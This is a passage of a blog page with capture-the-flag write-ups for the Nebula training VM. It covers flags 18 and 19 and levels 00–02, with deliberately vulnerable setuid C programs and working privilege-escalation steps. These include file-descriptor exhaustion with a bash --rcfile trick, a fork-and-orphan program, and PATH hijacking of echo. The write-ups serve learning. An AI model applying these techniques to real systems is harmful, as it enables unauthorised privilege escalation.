    <span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">strchr(line,</span> <span style="color: #e6db74">&#39;\r&#39;</span><span style="color: #f8f8f2">);</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(p)</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>

    <span style="color: #f8f8f2">dvprintf(</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;got [%s] as input</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">line);</span>

    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;login&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">5</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">dvprintf(</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;attempting to login</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
      <span style="color: #f8f8f2">login(line</span> <span style="color: #f92672">+</span> <span style="color: #ae81ff">6</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;logout&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">6</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">globals.loggedin</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;shell&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">5</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">dvprintf(</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;attempting to start shell</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(globals.loggedin)</span> <span style="color: #f8f8f2">{</span>
        <span style="color: #f8f8f2">execve(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv,</span> <span style="color: #f8f8f2">envp);</span>
        <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;unable to execve&quot;</span><span style="color: #f8f8f2">);</span>
      <span style="color: #f8f8f2">}</span>
      <span style="color: #f8f8f2">dprintf(</span><span style="color: #e6db74">&quot;Permission denied</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;logout&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">4</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">globals.loggedin</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;closelog&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">8</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(globals.debugfile)</span> <span style="color: #f8f8f2">fclose(globals.debugfile);</span>
      <span style="color: #f8f8f2">globals.debugfile</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">NULL;</span>
    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;site exec&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">9</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">notsupported(line</span> <span style="color: #f92672">+</span> <span style="color: #ae81ff">10</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;setuser&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">7</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">setuser(line</span> <span style="color: #f92672">+</span> <span style="color: #ae81ff">8</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">}</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>This is quite a lot a of code, but let&rsquo;s see what it does. The program accepts
two arguments <code>-v</code> and <code>-d</code> which increase verbosity level and set a debug file
respectively. If you launch it with <code>flag18 -v -v -v -d /tmp/debug</code> and then
<code>tail -f /tmp/debug</code> you can see what&rsquo;s going on. I used 3 <code>-v</code> because that&rsquo;s
the max debug level to be sure to capture everything.</p>

<p>Once it&rsquo;s running there&rsquo;s a number of commands we can issue. These are probably
going to give us something to poke around with. We can try to get a shell with
the <em>shell</em> command, but that means we need to be logged in. I&rsquo;ll make a
note of that. The <code>setuser</code> function has a fixed sized buffer. Let&rsquo;s try to
overflow that</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;setuser &#39; + &#39;A&#39;*128)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 -v -v -v -d /tmp/flag18/debug
*** buffer overflow detected ***: ./flag18 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6998d5]
/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0x6986d7]
/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0x697d35]
/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0x61df91]
/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0x5f5305]
/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0x697e09]
/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0x697d1f]
./flag18[0x8048df5]
./flag18[0x8048b1b]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x5cb113]
./flag18[0x8048bb1]
======= Memory map: ========
005b2000-00728000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00728000-0072a000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
0072a000-0072b000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
0072b000-0072e000 rw-p 00000000 00:00 0
0079b000-007b9000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007b9000-007ba000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007ba000-007bb000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007fd000-007fe000 r-xp 00000000 00:00 0          [vdso]
00886000-008a2000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
008a2000-008a3000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
008a3000-008a4000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
099f9000-09a1a000 rw-p 00000000 00:00 0          [heap]
b7832000-b7833000 rw-p 00000000 00:00 0
b783b000-b783e000 rw-p 00000000 00:00 0
bf8bf000-bf8e0000 rw-p 00000000 00:00 0          [stack]
Aborted
</pre></div>
</p>

<p>This led me to learn about <a href="https://en.wikipedia.org/wiki/Stack_canary#Stack_canaries">stack canaries</a>, and with this we&rsquo;re out of luck
(for a simple solution). This means the code has been compiled with
<em>FORTIFY_SOURCE</em> and this also going to prevent string formatting exploits in
the <code>notsupported</code> function.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ ./flag18 -v -v -v -d /tmp/flag18/debug
site exec %n
*** %n in writable segment detected ***
Aborted
</pre></div>
</p>

<p>Yup. In the process of researching this I also discovered a neat tool called
<a href="http://trapkit.de/tools/checksec.html">checksec.sh</a> that can help identify these compiler options early on.</p>

<p>So what have we got left? The function that checks the password file. If it&rsquo;s
not actually able to find the password file, it will log us in. Unfortunately
we&rsquo;re not able to delete it. However we can make the <code>fopen</code> call fail another
way. This error has happened a lot at work where we often deal with a lot of
files being open on a single system. Linux systems have a limit as to how
many filedescriptors it can have open at any one time. Because
the tool doesn&rsquo;t close the file descriptors until you call <code>closelog</code>,
we can just keep opening files until we hit the limit. Let&rsquo;s see what that
limit is.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ <span style="color: #f8f8f2">ulimit</span> -a
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 1817
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 1817
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
</pre></div>
</p>

<p><em>1024</em> is the limit. So let&rsquo;s open 1024 files and see what happens. As we have
a few file descriptors open already we just need to open 1021 more.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;login me\n&#39;*1021 + &#39;shell&#39;)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 -v -d /tmp/flag18/debug
./flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
</pre></div>
</p>

<p>Ah, so many file descriptors we can&rsquo;t open any more, not even to shared libraries.
We can close one and see how that goes.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 -v -d /tmp/flag18/debug
./flag18: -d: invalid option
Usage:	./flag18 [GNU long option] [option] ...
	./flag18 [GNU long option] [option] script-file ...
GNU long options:
	--debug
	--debugger
	--dump-po-strings
	--dump-strings
	--help
	--init-file
	--login
	--noediting
	--noprofile
	--norc
	--posix
	--protected
	--rcfile
	--restricted
	--verbose
	--version
Shell options:
	-irsD or -c command or -O shopt_option		(invocation only)
	-abefhkmnptuvxBCHP or -o option
</pre></div>
</p>

<p>Right, so we need to remember that we&rsquo;re running <code>sh</code> here, and our arguments
are being passed to it. Unfortunately <code>-d</code> and such are not valid here.
Time to read the manual&hellip;.</p>

<blockquote>
<p><strong>&ndash;rcfile file</strong></p>

<p>Execute commands from file instead of the system wide
initialization file /etc/bash.bashrc and the standard personal
initialization file ~/.bashrc if the shell is interactive
(see INVOCATION below).</p>
</blockquote>

<p>Ok, well, it&rsquo;s worth a shot.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 --rcfile -d /tmp/flag18/debug
./flag18: invalid option -- &#39;-&#39;
./flag18: invalid option -- &#39;r&#39;
./flag18: invalid option -- &#39;c&#39;
./flag18: invalid option -- &#39;f&#39;
./flag18: invalid option -- &#39;i&#39;
./flag18: invalid option -- &#39;l&#39;
./flag18: invalid option -- &#39;e&#39;
/tmp/flag18/debug: line 1: Starting: command not found
/tmp/flag18/debug: line 2: syntax error near unexpected token `(&#39;
/tmp/flag18/debug: line 2: `logged in successfully (without password file)&#39;
</pre></div>
</p>

<p>Heavens, it worked - sort of. Notice the <em>/tmp/flag18/debug: line 1: Starting: command not found</em>? That&rsquo;s because our <em>rcfile</em> is set to be our debug file. So
it writes to the debug file and then the shell will try to execute it. As we know
the first line in the file is <em>Starting up. Verbose level = 1</em>, so all we really
need to do to quash that error we need to create an executable with that name.
Inside that we will run out beloved <code>getflag</code></p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ <span style="color: #f8f8f2">echo </span>getflag &gt; /tmp/Starting
level18@nebula:/home/flag18$ chmod +x !<span style="color: #960050; background-color: #1e0010">$</span>
chmod +x /tmp/Starting
level18@nebula:/home/flag18$ <span style="color: #f8f8f2">export PATH</span><span style="color: #f92672">=</span><span style="color: #e6db74">${</span><span style="color: #f8f8f2">PATH</span><span style="color: #e6db74">}</span>:/tmp
level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 --rcfile -d /tmp/flag18/debug
./flag18: invalid option -- &#39;-&#39;
./flag18: invalid option -- &#39;r&#39;
./flag18: invalid option -- &#39;c&#39;
./flag18: invalid option -- &#39;f&#39;
./flag18: invalid option -- &#39;i&#39;
./flag18: invalid option -- &#39;l&#39;
./flag18: invalid option -- &#39;e&#39;
You have successfully executed getflag on a target account
/tmp/flag18/debug: line 2: syntax error near unexpected token `(&#39;
/tmp/flag18/debug: line 2: `logged in successfully (without password file)&#39;
</pre></div>
</p>

<p>The harder ways are beyond what I can do, but for those interested in
circumventing <code>FORTIFY_SOURCE</code> you can read <a href="http://phrack.org/issues/67/9.html">A Eulogy for Formatting Strings</a>. I&rsquo;ll be re-reading that for sure.</p>

<h2 id="flag-19:eaf9fabfe6e85567a2c1f06adf83e2d8">Flag 19</h2>

<blockquote>
<p>There is a flaw in the below program in how it operates.</p>
</blockquote>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/stat.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">pid_t</span> <span style="color: #f8f8f2">pid;</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
  <span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">stat</span> <span style="color: #f8f8f2">statbuf;</span>

  <span style="color: #75715e">/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>

  <span style="color: #f8f8f2">snprintf(buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;/proc/%d&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">getppid());</span>

  <span style="color: #75715e">/* stat() it */</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(stat(buf,</span> <span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">statbuf)</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to check parent process</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #75715e">/* check the owner id */</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(statbuf.st_uid</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #75715e">/* If root started us, it is ok to start the shell */</span>

    <span style="color: #f8f8f2">execve(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv,</span> <span style="color: #f8f8f2">envp);</span>
    <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;Unable to execve&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;You are unauthorized to run this program</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>So we can get the shell we want if we can run this as root. How can we do that?
This exploits involves a knowledge of Linux forks. Basically if a process
forks and the parent dies, the child will automatically be run under <code>init</code>.
This is called <a href="http://wiki.linuxquestions.org/wiki/Fork_off_and_die">Fork off and die</a>. So who does <code>init</code> run as?</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level19@nebula:/tmp/flag19$ ps aux <span style="color: #f8f8f2">|</span> grep init
root         1  0.0  0.6   3196  1512 ?        Ss   00:32   0:00 /sbin/init
</pre></div>
</p>

<p>In order to make use of this we need to run <code>flag18</code> as a forked process and
then kill the parent. The arguments to <code>flag18</code> are passed onto the shell
it executes, and thus we can make use of this. I&rsquo;ll write some C code
to fork the <code>flag18</code> process to which we will pass the <code>getflag</code>. It should
work.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;unistd.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">childPID</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fork();</span>
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(childPID</span> <span style="color: #f92672">&gt;=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span> <span style="color: #75715e">// forked</span>
        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(childPID</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span> <span style="color: #75715e">// child</span>
            <span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
            <span style="color: #f8f8f2">setresuid(geteuid(),geteuid(),geteuid());</span>
            <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">args[]</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;-c&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;/bin/getflag&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">NULL};</span>
            <span style="color: #f8f8f2">execve(</span><span style="color: #e6db74">&quot;/home/flag19/flag19&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">args,</span> <span style="color: #f8f8f2">envp);</span>
        <span style="color: #f8f8f2">}</span>
    <span style="color: #f8f8f2">}</span>
    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>Get the idea? Right, let&rsquo;s taste this pudding</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level19@nebula:/tmp/flag19$ gcc forkit.c -o forkit
level19@nebula:/tmp/flag19$ ./forkit
level19@nebula:/tmp/flag19$ You have successfully executed getflag on a target account
</pre></div>
</p>

<p><strong>Nebula done.</strong></p>

<h2 id="closing-words:eaf9fabfe6e85567a2c1f06adf83e2d8">Closing words</h2>

<p>Firstly: Thanks for taking the time to read this. Please leave any feedback or
comments below (or twitter/email if you prefer).</p>

<p>Secondly: If you are here because you are also playing <em>Nebula</em> and are
new to this like I am, this write up might seem like magic.
You&rsquo;re struggling to figure out how to get past a certain
level and then this text makes it seem like magic.</p>

<p>It&rsquo;s not like that. I spent a lot of time working through the later levels as I
quickly learned how little I knew. Much time was spent researching and learning
about things I thought I already knew. Turns out I knew very little about them.
There were a lot of failures on the way, but if I kept those in, this post
would be much much longer. The thought process seems very simple in write ups,
but trust me, there&rsquo;s quite a bit of puzzling and thinking to do.</p>

<p>It&rsquo;s early days for me too, and I very much enjoyed <em>Nebula</em>, and have a whole
new set of tools and ideas in my arsenal for the next challenge.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/">
        Cracking Nebula Part 1
      </a>
    </h1>

    <span class="post-date">Tue, Jun 24, 2014</span>

    

<p>On <a href="http://www.exploit-exercises.com/">Exploit Exercises</a> you can find a
number of CTF (Capture The Flag) VM images where you can practice your
exploiting, hacking and general computer savviness. I&rsquo;ve been working
my way through the Nebula machine and figured I might as well write
up the process both for other&rsquo;s benefit if they get stuck, and also as
a sort of diary for myself, so I can refer back to any info if I need to.</p>

<p>The Nebula VM can be downloaded from the <a href="http://www.exploit-exercises.com/download">Exploit Exercises download page</a></p>

<p>To quickly explain what you need to do: Login in as user <code>levelxx</code> and then run <code>getflag</code> as user <code>flagxx</code>.
There&rsquo;s some explanations for each level on the machine&rsquo;s page over at Exploit Exercises.</p>

<h2 id="level-00:30500b9ac805cc116818bc6edd5ba7d1">Level 00</h2>

<blockquote>
<p>This level requires you to find a Set User ID program that will run as the &ldquo;flag00&rdquo; account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>

<p>Alternatively, look at the find man page.</p>
</blockquote>

<p>So somewhere from the root directory is a file will run as the flag00 user. As stated you can either look for it, or
use <code>find</code> to search for it. I chose to do a little bit of both. Running <code>find</code> from the root of a system can take some time so I chose to take a look first. Amongst the usual directories at linux root level is a <code>rofs</code> directory. So let&rsquo;s take a look inside.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">flag00@nebula:/rofs$ ls
bin   dev  home        lib    mnt  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  media  opt  root  sbin  srv      tmp  var
</pre></div>


<p>Looks the same, but let&rsquo;s run a find in here.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level00@nebula:/rofs$ find -user flag00 -print 2&gt; /dev/null
./bin/.../flag00
./home/flag00
./home/flag00/.bash_logout
./home/flag00/.bashrc
./home/flag00/.profile
</pre></div>


<p>There&rsquo;s the usual stuff, but there&rsquo;s also <code>./bin/.../flag00</code>. If you run this you can get the flag:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level00@nebula:/rofs$ ./bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:/rofs$ getflag
You have successfully executed getflag on a target account
</pre></div>


<h2 id="level-01:30500b9ac805cc116818bc6edd5ba7d1">Level 01</h2>

<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">gid_t</span> <span style="color: #f8f8f2">gid;</span>
  <span style="color: #66d9ef">uid_t</span> <span style="color: #f8f8f2">uid;</span>
  <span style="color: #f8f8f2">gid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getegid();</span>
  <span style="color: #f8f8f2">uid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">geteuid();</span>

  <span style="color: #f8f8f2">setresgid(gid,</span> <span style="color: #f8f8f2">gid,</span> <span style="color: #f8f8f2">gid);</span>
  <span style="color: #f8f8f2">setresuid(uid,</span> <span style="color: #f8f8f2">uid,</span> <span style="color: #f8f8f2">uid);</span>

  <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/usr/bin/env echo and now what?&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>
</blockquote>

<p>So let&rsquo;s see about this vulnerability. It doesn&rsquo;t accept user input, but luckily there&rsquo;s only one place where it actually runs anything, so that makes it easier to narrow down where its weakness is. The <code>system</code> call executes an <code>echo</code> but there&rsquo;s a small oversight. It calls <code>echo</code> without an explicit path, can you see where this is going? As <code>flag01</code> runs as user <code>flag01</code>, anything it executes will also run under that user.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level01@nebula:/home/flag01$ mkdir /tmp/mybin
level01@nebula:/home/flag01$ <span style="color: #f8f8f2">cd</span> /tmp/mybin
level01@nebula:/tmp/mybin$ which getflag
/bin/getflag
level01@nebula:/tmp/mybin$ cp /bin/getflag <span style="color: #f8f8f2">echo</span>
level01@nebula:/tmp/mybin$<span style="color: #f8f8f2"> cd</span> ~flag01
level01@nebula:/home/flag01$ <span style="color: #f8f8f2">export PATH</span><span style="color: #f92672">=</span>/tmp/mybin:<span style="color: #e6db74">${</span><span style="color: #f8f8f2">PATH</span><span style="color: #e6db74">}</span>
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account
</pre></div>


<h2 id="level-02:30500b9ac805cc116818bc6edd5ba7d1">Level 02</h2>

<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
</blockquote>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
